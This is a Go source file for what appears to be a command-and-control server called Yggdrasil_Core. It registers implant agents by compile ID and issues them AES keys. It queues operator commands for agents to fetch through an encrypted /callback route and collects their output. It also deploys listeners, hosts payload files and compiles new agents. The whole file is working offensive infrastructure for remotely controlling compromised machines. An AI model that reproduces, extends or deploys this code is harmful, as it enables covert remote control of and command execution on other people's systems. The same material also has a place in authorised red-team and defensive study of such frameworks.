package main

import (
	"encoding/base64"
	"github.com/gin-gonic/gin"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	go startAliveMonitor()

	type Admin struct {
		UUID string `json:"uuid" binding:"required"`
		Cmd  string `json:"command" binding:"required"`
	}
	// type RegisterRequest struct {
	// 	User     string `json:"user"`
	// 	CID      string `json:"compile_id" binding:"required"`
	// 	Profile  string `json:"profile"`
	// 	Hostname string `json:"hostname"`
	// 	Process  string `json:"process"`
	// 	PID      string `json:"pid"`
	// 	IP       string `json:"ip"`
	// }
	type CommandRequest struct {
		UUID   string `json:"uuid" binding:"required"`
		Data   string `json:"data"`
		Action string `json:"action"`
	}

	route := gin.Default()

	// Routes
	// File hosting (stored on Yggdrasil_Core)
	route.PUT("/files/*path", func(c *gin.Context) {
		relPath := strings.TrimPrefix(c.Param("path"), "/")
		cleanPath := filepath.Clean(relPath)
		if cleanPath == "." || strings.HasPrefix(cleanPath, "..") || strings.Contains(cleanPath, "..") {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid path"})
			return
		}

		baseDir := "/app/hosted_files"
		fullPath := filepath.Join(baseDir, cleanPath)
		if err := os.MkdirAll(filepath.Dir(fullPath), 0o755); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create directory"})
			return
		}
		file, err := os.Create(fullPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create file"})
			return
		}
		defer file.Close()

		if _, err := io.Copy(file, c.Request.Body); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to write file"})
			return
		}

		c.JSON(http.StatusOK, gin.H{"ok": true})
	})

	route.GET("/files/*path", func(c *gin.Context) {
		relPath := strings.TrimPrefix(c.Param("path"), "/")
		cleanPath := filepath.Clean(relPath)
		if cleanPath == "." || strings.HasPrefix(cleanPath, "..") || strings.Contains(cleanPath, "..") {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid path"})
			return
		}

		baseDir := "/app/hosted_files"
		fullPath := filepath.Join(baseDir, cleanPath)
		c.File(fullPath)
	})

	route.DELETE("/files/*path", func(c *gin.Context) {
		relPath := strings.TrimPrefix(c.Param("path"), "/")
		cleanPath := filepath.Clean(relPath)
		if cleanPath == "." || strings.HasPrefix(cleanPath, "..") || strings.Contains(cleanPath, "..") {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid path"})
			return
		}

		baseDir := "/app/hosted_files"
		fullPath := filepath.Join(baseDir, cleanPath)
		if err := os.Remove(fullPath); err != nil {
			if os.IsNotExist(err) {
				c.JSON(http.StatusOK, gin.H{"ok": true, "deleted": false})
				return
			}
			c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete file"})
			return
		}
		c.JSON(http.StatusOK, gin.H{"ok": true, "deleted": true})
	})

	route.GET("/api/listeners/available", func(c *gin.Context) {
		items, err := listListenerTemplates()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, items)
	})

	route.GET("/api/listeners/active", func(c *gin.Context) {
		c.JSON(http.StatusOK, listActiveListeners())
	})

	route.POST("/api/listeners/deploy", func(c *gin.Context) {
		var req struct {
			Name     string `json:"name"`
			Template string `json:"template"`
			Protocol string `json:"protocol"`
			Port     int    `json:"port"`
		}
		if err := c.BindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request body"})
			return
		}
		listener, err := deployListener(req.Name, req.Template, req.Protocol, req.Port)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, listener)
	})

	route.DELETE("/api/listeners/:id", func(c *gin.Context) {
		listenerID := strings.TrimSpace(c.Param("id"))
		if listenerID == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "listener id is required"})
			return
		}
		if err := removeListener(listenerID); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"ok": true})
	})

	route.POST("/admin", func(c *gin.Context) {
		var data Admin
		if err := c.BindJSON(&data); err == nil {
			R.RPush(Ctx, data.UUID, data.Cmd)
			if R.LLen(Ctx, data.UUID).Val() > 100 {
				R.LPop(Ctx, data.UUID)
			}
			c.String(http.StatusOK, "Command Sent!")
			return
		} else {
			c.JSON(http.StatusBadRequest, gin.H{"Error": "Bad Request"})
			return
		}
	})

	route.POST("/register", func(c *gin.Context) {
		var data RegisterRequest
		if err := c.BindJSON(&data); err == nil {

			// Verify connections
			if DB == nil {
				log.Println("DB is nil")
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Database not connected"})
				return
			}
			if R == nil {
				log.Println("Redis client is nil")
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Redis not connected"})
				return
			}

			rows, err := DB.Query("SELECT compile_id FROM payloads WHERE compile_id = ?", data.CID)
			if err != nil {
				log.Println(err)
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Database query failed"})
				return
			}
			defer rows.Close()
			result := get_data(rows)

			if len(result) == 0 {
				c.JSON(http.StatusOK, gin.H{
					"uuid":  "",
					"data":  "",
					"param": "",
				})
				return
			}

			uuid_raw, result := register_agent(&data)
			if len(result) == 0 || len(result[0]) < 2 {
				c.JSON(http.StatusInternalServerError, gin.H{"Error": "Payload not found or missing data"})
				return
			}
			uuid := base64.StdEncoding.EncodeToString([]byte(uuid_raw))
			key := base64.StdEncoding.EncodeToString([]byte(result[0][0]))
			iv := base64.StdEncoding.EncodeToString([]byte(result[0][1]))
			c.JSON(200, gin.H{
				"uuid":  string(uuid),
				"data":  string(key),
				"param": string(iv),
			})

		} else {
			c.JSON(http.StatusBadRequest, gin.H{"Error": "Bad Request"})
		}
	})

	route.POST("/callback", func(c *gin.Context) {
		var data CommandRequest
		var err error
		if err = c.BindJSON(&data); err != nil {
			c.JSON(400, gin.H{"error": err.Error()})
			return
		}
		if data.Action == "Request" {
			keys := get_keys(data.UUID)
			cache, err := R.LIndex(Ctx, data.UUID, -1).Result()
			if err != nil {
				log.Println(err)
				return
			}
			if cache == "SEEN" || cache == "AGENT REGISTERED" {
				update_seen(data.UUID)
				if keys != nil {
					enc_command, err := aes_encrypt([]byte(""), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					enc_param, err := aes_encrypt([]byte(""), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					c.JSON(200, gin.H{
						"data":  enc_command,
						"param": enc_param,
					})
					return
				} else {
					c.JSON(200, gin.H{
						"data":  "",
						"param": "",
					})
					return
				}
			} else {
				cmd := strings.SplitN(cache, " ", 2)
				var param string
				if len(cmd) > 1 {
					param = cmd[1]
				} else {
					param = ""
				}
				update_seen(data.UUID)
				R.RPush(Ctx, data.UUID, "SEEN")
				small_check(data.UUID)
				
				if keys != nil {
					enc_command, err := aes_encrypt([]byte(cmd[0]), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					enc_param, err := aes_encrypt([]byte(param), keys[0][0], keys[0][1])
					if err != nil {
						log.Println(err)
						return
					}
					c.JSON(200, gin.H{
						"data":  enc_command,
						"param": enc_param,
					})
					return
				} else {
					b64cmd := base64.StdEncoding.EncodeToString([]byte(cmd[0]))
					b64param := base64.StdEncoding.EncodeToString([]byte(param))
					c.JSON(200, gin.H{
						"data":  string(b64cmd),
						"param": string(b64param),
					})
					return
				}
			}
		} else if data.Action == "Reply" {
			aes_keys := get_keys(data.UUID)
			var output string
			if aes_keys != nil {
				output, err = aes_decrypt(data.Data, aes_keys[0][0], aes_keys[0][1])
				if err != nil {
					log.Println(err)
					return
				}
			} else {
				bytedata, err := base64.StdEncoding.DecodeString(data.Data)
				if err != nil {
					log.Println(err)
					return
				}
				output = string(bytedata)
			}
			key := data.UUID + "-output"
			command := getLastIssuedCommand(data.UUID)
			if data.UUID != "" && output != "" {
				appendAgentHistory(data.UUID, command, output)
				R.Publish(Ctx, key, output)
			} else {
				failure := "Data failed to be decrypted or NULL response\n"
				appendAgentHistory(data.UUID, command, failure)
				R.Publish(Ctx, key, failure)
			}
			c.String(http.StatusOK, "Success")
			return
		}
	})

	route.GET("/api/agent-profiles", func(c *gin.Context) {
		profiles, err := listAgentProfiles()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, profiles)
	})

	route.POST("/api/build-agent", func(c *gin.Context) {
		var compileConfig CompileConfig
		if err := c.BindJSON(&compileConfig); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request body"})
			return
		}
		result, logs, err := compileAgent(&compileConfig)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error(), "logs": logs})
			return
		}
		recordErr := recordPayload(&compileConfig, result.CompileID)
		if recordErr != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to record payload in database", "logs": logs})
			return
		}
		if result.Status == "compiled" {
			c.JSON(http.StatusOK, gin.H{"message": "Agent compiled successfully", "logs": logs, "compile_id": result.CompileID})
		} else {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to compile agent. Docker issue", "logs": logs})
		}
	})

	route.RunTLS(":8000", "/app/certs/server.crt", "/app/certs/server.key")
}
